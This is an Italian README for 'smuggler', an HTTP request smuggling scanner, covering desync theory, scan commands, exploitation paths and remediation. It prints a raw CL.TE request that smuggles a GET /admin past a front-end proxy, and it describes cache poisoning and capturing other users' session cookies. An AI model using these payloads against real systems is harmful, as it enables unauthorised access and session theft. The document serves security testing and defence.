<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📦 contrabbandiere - Foglio informativo completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```
<palign="centro">
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="smuggler">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sicurezza Web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<palign="centro">
  <b>📦 Strumento Python modulare ultraveloce progettato per rilevare e verificare le vulnerabilità legate al contrabbando di richieste HTTP (CL.TE, TE.CL e desincronizzazione della mutazione dell'intestazione) nell'infrastruttura web moderna</b>
</p>

---

## 📋 Sommario

- [Panoramica e teoria del contrabbando HTTP](#-overview--http-smuggling-theory)
  - [Discrepanze CL.TE vs TE.CL](#clte-vs-tecl-discrepanze)
- [Installazione](#-installazione)
- [Scansione di base del target](#-basic-target-scanning)
- [Configurazioni di scansione e motori di mutazione](#-scan-configurations--mutation-engines)
  - [Scansione predefinita vs esaustiva](#scansione predefinita-vs-esaustiva)
  - [Intestazioni e cookie personalizzati](#custom-headers--cookie)
- [Scansione multi-target e pipeline](#-multi-target--pipeline-scanning)
- [Analisi dei risultati e percorsi di sfruttamento](#-analyzing-results--exploitation-paths)
  - [Avvelenamento della cache tramite contrabbando](#avvelenamento-della-cache tramite contrabbando)
  - [Aggirare i controlli di sicurezza front-end](#ignorare-i-controlli-di-sicurezza-front-end)
  - [Dirottamento delle richieste di altri utenti](#dirottamento-richieste-di-altri-utenti)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e riparazione](#-considerazioni-difensive--riparazione)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e teoria del contrabbando HTTP

Il contrabbando di richieste HTTP si verifica quando un proxy/bilanciatore del carico front-end e un server Web back-end non sono d'accordo sui limiti di una richiesta HTTP:

### Discrepanze tra CL.TE e TE.CL
- **CL.TE:** Il front-end utilizza `Content-Length`, il back-end utilizza `Transfer-Encoding: chunked`.
- **TE.CL:** Il front-end utilizza `Transfer-Encoding: chunked`, il back-end utilizza `Content-Length`.
- **TE.TE:** Entrambi supportano `Transfer-Encoding`, ma si può essere indotti a ignorarlo tramite l'offuscamento dell'intestazione (ad esempio, `Transfer-Encoding: xchunked`, tabulazioni o piegatura delle righe).

Creato da **defparam (Evan Ricaurte)**, **smuggler** inserisce payload accuratamente realizzati per osservare ritardi temporali o risposte di desincronizzazione senza compromettere la stabilità del servizio backend.

---

## 📥Installazione
```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```
---

## 🚀 Scansione di base del bersaglio

Esegui la scansione di un singolo endpoint dell'applicazione Web:
```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```
Per impostazione predefinita, il contrabbandiere testa i comportamenti sia `CL.TE` che `TE.CL` utilizzando payload di tempistica sicura.

---

## ⚙️ Configurazioni di scansione e motori di mutazione

### Scansione predefinita o esaustiva
Smuggler include diversi profili di carico utile:
- **Profilo predefinito:** Mutazioni di desincronizzazione veloci e comuni.
- **Profilo esaustivo:** Mutazioni complete che testano variazioni di spazi bianchi, intestazioni multiple e intestazioni di codifica di trasferimento offuscate:
```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```
### Intestazioni e cookie personalizzati
Quando sono richieste l'autenticazione o intestazioni host specifiche:
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```
---

## 🌐 Scansione multi-target e pipeline

Endpoint dei tubi scoperti da `httpx` o `subfinder` direttamente nel contrabbandiere:
```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```
---

## 💥 Analisi dei risultati e dei percorsi di sfruttamento

Quando il trafficante segnala una corrispondenza positiva:
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```
### Avvelenamento della cache tramite contrabbando
Contrabbandare una richiesta che generi un reindirizzamento fuori sito (ad esempio manipolazione dell'intestazione dell'host) per avvelenare le cache Web che forniscono librerie JavaScript a tutti gli utenti.

### Aggirare i controlli di sicurezza front-end
Se il proxy front-end blocca `/admin`, contrabbanda una richiesta interna secondaria che raggiunga direttamente il back-end senza ispezione del proxy:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```
### Violazione delle richieste di altri utenti
Contrabbandare un prefisso di una richiesta HTTP. Quando l'utente successivo invia la sua richiesta, questa viene aggiunta alla tua richiesta di contrabbando, esponendo i suoi cookie e token di sessione.

---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Bersaglio singolo rapido** | `python3 smuggler.py -u https://target.com/` |
| **Scansione approfondita esaustiva**| `python3 smuggler.py -u https://target.com/ -c exhaustive` |
| **Elenco destinazioni scansione** | `python3 smuggler.py -f targets.txt -t 15` |
| **Intestazioni/Cookie personalizzati**| `python3 smuggler.py -u <URL> -H "Cookie: sess=123"` |
| **Timeout personalizzato** | `python3 smuggler.py -u <URL> --timeout 15` |

---

## 🛡️ Considerazioni difensive e rimedi

1. **Applica HTTP/2 o HTTP/3 end-to-end:** HTTP/2 definisce lunghezze di frame inequivocabili, eliminando l'ambiguità dell'intestazione.
2. **Normalizza le intestazioni HTTP:** configura i proxy inversi per rifiutare le richieste contenenti sia `Content-Length` che `Transfer-Encoding`.
3. **Elimina mutazioni ambigue:** Elimina le richieste con intestazioni `Transfer-Encoding` offuscate (ad esempio, spazi prima dei due punti, valori multipli).

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Il contrabbando di richieste HTTP può interrompere le code di backend live e avvelenare i nodi di caching condivisi. contrabbandiere deve essere utilizzato esclusivamente su obiettivi di prova esplicitamente autorizzati con il rigoroso permesso dei proprietari dei beni.